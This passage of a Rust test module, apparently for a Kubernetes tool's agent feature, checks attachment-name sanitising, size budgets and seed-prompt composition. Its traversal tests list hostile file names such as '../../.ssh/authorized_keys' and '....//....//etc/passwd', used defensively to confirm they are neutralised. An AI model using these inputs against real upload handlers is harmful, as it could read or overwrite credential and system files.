    fn a_registry_without_transcripts_has_no_store() {
        assert!(AgentRegistry::new().transcripts().is_none());
        let with = AgentRegistry::with_transcripts(PathBuf::from("/tmp/agent-logs"));
        assert_eq!(
            with.transcripts().map(|s| s.dir().to_path_buf()),
            Some(PathBuf::from("/tmp/agent-logs"))
        );
    }

    // -- attachment names --------------------------------------------------

    #[test]
    fn an_ordinary_attachment_name_survives_intact() {
        assert_eq!(
            sanitize_attachment_name("api-server-7d9f.log"),
            Some("api-server-7d9f.log".to_string())
        );
        assert_eq!(
            sanitize_attachment_name("pod logs (nginx).txt"),
            Some("pod logs (nginx).txt".to_string())
        );
    }

    #[test]
    fn a_traversal_attempt_cannot_survive_sanitising() {
        // The case this function exists for: a name is client-supplied and
        // becomes a filename, so `../../.ssh/authorized_keys` must be
        // impossible — not merely unlikely.
        for hostile in [
            "../../.ssh/authorized_keys",
            "..",
            "../",
            "../../..",
            "....//....//etc/passwd",
            "..\\..\\Windows\\System32\\config",
        ] {
            let sanitized = sanitize_attachment_name(hostile);
            match sanitized {
                None => {}
                Some(name) => {
                    assert!(!name.contains('/'), "{hostile:?} kept a separator: {name:?}");
                    assert!(!name.contains('\\'), "{hostile:?} kept a separator: {name:?}");
                    assert_ne!(name, "..");
                    assert_ne!(name, ".");
                    // Whatever survived must be exactly one ordinary component.
                    let path = Path::new(&name);
                    assert_eq!(path.components().count(), 1, "{hostile:?} -> {name:?}");
                    assert!(matches!(
                        path.components().next(),
                        Some(Component::Normal(_))
                    ));
                }
            }
        }
    }

    #[test]
    fn an_absolute_path_is_reduced_to_a_plain_name() {
        // The leading separator is what makes `join` discard our directory
        // entirely, so it is the one character that must not survive.
        let name = sanitize_attachment_name("/etc/passwd").expect("name");
        assert!(!name.contains('/'));
        assert_eq!(name, "-etc-passwd");

        // Windows drive-relative and absolute forms: the colon goes too, so
        // `C:` can never re-anchor the path.
        let win = sanitize_attachment_name(r"C:\Windows\win.ini").expect("name");
        assert!(!win.contains('\\') && !win.contains(':'));
    }

    #[test]
    fn control_characters_never_reach_a_filename() {
        let name = sanitize_attachment_name("logs\u{0}\n\r\t\u{1b}[31m.txt").expect("name");
        assert!(!name.chars().any(char::is_control), "{name:?}");
    }

    #[test]
    fn a_name_that_is_only_hostile_leaves_nothing() {
        // `None` rather than a guess: the caller substitutes a positional
        // default, which is honest about having discarded the request's name.
        assert_eq!(sanitize_attachment_name(""), None);
        assert_eq!(sanitize_attachment_name("   "), None);
        assert_eq!(sanitize_attachment_name("."), None);
        assert_eq!(sanitize_attachment_name(".."), None);
        assert_eq!(sanitize_attachment_name("\u{0}\u{1}"), None);
        // Nothing but the placeholders the replacements left behind.
        assert_eq!(sanitize_attachment_name("../.."), None);
        assert_eq!(sanitize_attachment_name("///"), None);
    }

    #[test]
    fn a_long_name_is_capped_by_characters_not_bytes() {
        // Pod and container names concatenate into very long labels, and a
        // byte cap would land mid-codepoint on a non-ASCII one.
        let long = sanitize_attachment_name(&"é".repeat(500)).expect("name");
        assert_eq!(long.chars().count(), ATTACHMENT_NAME_MAX_CHARS);
    }

    #[test]
    fn two_attachments_with_one_name_get_two_files() {
        // Two containers' logs are both `logs.txt`; without the ordinal the
        // second would silently overwrite the first.
        assert_eq!(attachment_file_name(0, "logs.txt"), "01-logs.txt");
        assert_eq!(attachment_file_name(1, "logs.txt"), "02-logs.txt");
        // …and a name that sanitizes away still gets a file of its own.
        assert_eq!(attachment_file_name(2, "../.."), "03-attachment");
    }

    #[test]
    fn a_stored_file_name_is_always_one_plain_component() {
        for hostile in ["../../etc/passwd", "/etc/passwd", "..", "\u{0}", "", "a/b"] {
            let name = attachment_file_name(0, hostile);
            let path = Path::new(&name);
            assert_eq!(path.components().count(), 1, "{hostile:?} -> {name:?}");
            assert!(matches!(
                path.components().next(),
                Some(Component::Normal(_))
            ));
        }
    }

    // -- attachment budget -------------------------------------------------

    fn attachment(name: &str, content: &str) -> SeedAttachment {
        SeedAttachment {
            name: name.to_string(),
            content: content.to_string(),
        }
    }

    #[test]
    fn attachment_sizes_are_summed_across_the_whole_request() {
        let set = vec![attachment("a.log", "12345"), attachment("b.log", "678")];
        assert_eq!(attachments_total_bytes(&set), 8);
        assert_eq!(attachments_total_bytes(&[]), 0);
        assert_eq!(check_attachment_budget(&set, 8).ok(), Some(8));
    }

    #[test]
    fn passing_the_budget_is_a_413_not_a_full_disk() {
        let set = vec![attachment("a.log", "12345"), attachment("b.log", "678")];
        let err = check_attachment_budget(&set, 7).expect_err("over budget");
        assert!(matches!(
            err,
            AgentError::AttachmentsTooLarge { total: 8, max: 7 }
        ));

        let mapped: AppError = err.into();
        match mapped {
            AppError::PayloadTooLarge(msg) => {
                // Both numbers, so the client can tell how much to trim.
                assert!(msg.contains('8') && msg.contains('7'), "{msg}");
            }
            other => panic!("expected PayloadTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn the_budget_counts_bytes_not_characters() {
        // A megabyte of UTF-8 logs is a megabyte of disk whatever it says.
        let multibyte = attachment("a.log", &"é".repeat(10));
        assert_eq!(attachments_total_bytes(&[multibyte]), 20);
    }

    // -- composed prompt ---------------------------------------------------

    #[test]
    fn the_prompt_names_every_attachment_by_absolute_path() {
        let paths = vec![
            "/data/agent-attachments/s1/01-pod.log".to_string(),
            "/data/agent-attachments/s1/02-events.txt".to_string(),
        ];
        assert_eq!(
            compose_seed_prompt(Some("Explain these logs."), &paths),
            Some(
                "Explain these logs.\n\n\
                 Attached files:\n\
                 /data/agent-attachments/s1/01-pod.log\n\
                 /data/agent-attachments/s1/02-events.txt"
                    .to_string()
            )
        );
    }

    #[test]
    fn a_prompt_without_attachments_is_passed_through_verbatim() {
        // Nothing is invented on the caller's behalf — no persona, no
        // instructions they did not write.
        assert_eq!(
            compose_seed_prompt(Some("  Explain these logs.  "), &[]),
            Some("Explain these logs.".to_string())
        );
    }

    #[test]
    fn attachments_without_a_prompt_still_say_where_they_are() {
        assert_eq!(
            compose_seed_prompt(None, &["/data/a/01-pod.log".to_string()]),
            Some("Attached files:\n/data/a/01-pod.log".to_string())
        );
        assert_eq!(
            compose_seed_prompt(Some("   "), &["/data/a/01-pod.log".to_string()]),
            Some("Attached files:\n/data/a/01-pod.log".to_string())
        );
    }

    #[test]
    fn nothing_to_seed_composes_nothing() {
        assert_eq!(compose_seed_prompt(None, &[]), None);
        assert_eq!(compose_seed_prompt(Some("  "), &[]), None);

        assert!(SessionSeed::default().is_empty());
        assert!(SessionSeed {
            prompt: Some("  ".to_string()),
            attachments: Vec::new(),
        }
        .is_empty());
        assert!(!SessionSeed {
            prompt: None,
            attachments: vec![attachment("a.log", "x")],
        }
        .is_empty());
    }

    // -- seed status and storage ------------------------------------------

    #[test]
    fn seed_status_strings_are_the_stored_and_wire_values() {
        assert_eq!(SeedStatus::None.as_str(), "none");
        assert_eq!(SeedStatus::Pending.as_str(), "pending");
        assert_eq!(SeedStatus::Sent.as_str(), "sent");
        assert_eq!(SeedStatus::TimedOut.as_str(), "timed_out");
        assert_eq!(SeedStatus::Failed.as_str(), "failed");
    }

    #[test]
    fn attachments_sit_beside_the_transcripts_in_the_app_data_directory() {
        assert_eq!(
            attachment_dir_beside_transcripts(Path::new(
                "/Users/x/Library/Application Support/KlustrEye/agent-logs"
            )),
            PathBuf::from("/Users/x/Library/Application Support/KlustrEye/agent-attachments")
        );
        assert_eq!(
            attachment_dir_beside_transcripts(Path::new("agent-logs")),
            PathBuf::from("./agent-attachments")
        );
    }

    #[test]
    fn an_attachment_directory_is_only_ever_named_by_a_plain_uuid() {
        // Same rule as the transcript path: a session id is the only thing that
        // names a directory, so it is validated rather than sanitized.
        let store = AttachmentStore::new(PathBuf::from("/tmp/agent-attachments"));
        assert_eq!(
            store.dir_for(A_UUID),
            Some(PathBuf::from(format!("/tmp/agent-attachments/{A_UUID}")))
        );
        for hostile in ["../escape", "", "not-a-uuid", "3f2b1c4a9d8e4f108a2b5c6d7e8f9a0b"] {
            assert!(store.dir_for(hostile).is_none(), "accepted {hostile:?}");
        }
    }

    #[test]
    fn a_registry_with_transcripts_can_also_store_attachments() {
        let reg = AgentRegistry::with_transcripts(PathBuf::from("/tmp/data/agent-logs"));
        assert_eq!(
            reg.attachments().map(|s| s.dir().to_path_buf()),
            Some(PathBuf::from("/tmp/data/agent-attachments"))
        );
        assert!(AgentRegistry::new().attachments().is_none());
    }

    #[test]
    fn identical_pattern_sets_share_one_compilation() {
        let reg = AgentRegistry::new();
        let list = vec![r"\(y/n\)".to_string()];
        let first = reg.compiled_patterns(&list);
        let second = reg.compiled_patterns(&list.clone());
        assert!(Arc::ptr_eq(&first, &second));

        let other = reg.compiled_patterns(&[r"continue\?".to_string()]);
        assert!(!Arc::ptr_eq(&first, &other));
    }
}
